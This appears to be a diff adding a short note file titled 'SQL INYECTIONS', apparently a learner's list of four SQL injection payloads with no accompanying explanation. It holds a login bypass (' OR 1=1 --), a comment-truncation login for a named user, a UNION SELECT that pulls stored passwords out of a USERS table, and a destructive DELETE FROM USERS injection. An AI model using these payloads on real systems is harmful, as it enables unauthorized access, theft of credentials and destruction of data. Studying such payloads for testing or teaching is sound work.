@@ -1,0 +1,9 @@
+SQL INYECTIONS
+
+' OR 1=1 --
+
+rosa' --
+
+juan' UNION SELECT userpass AS username, '123' userpass, '123' sensitive_information FROM USERS WHERE username = 'juan' ORDER BY username DESC; --
+
+'; DELETE FROM USERS; --
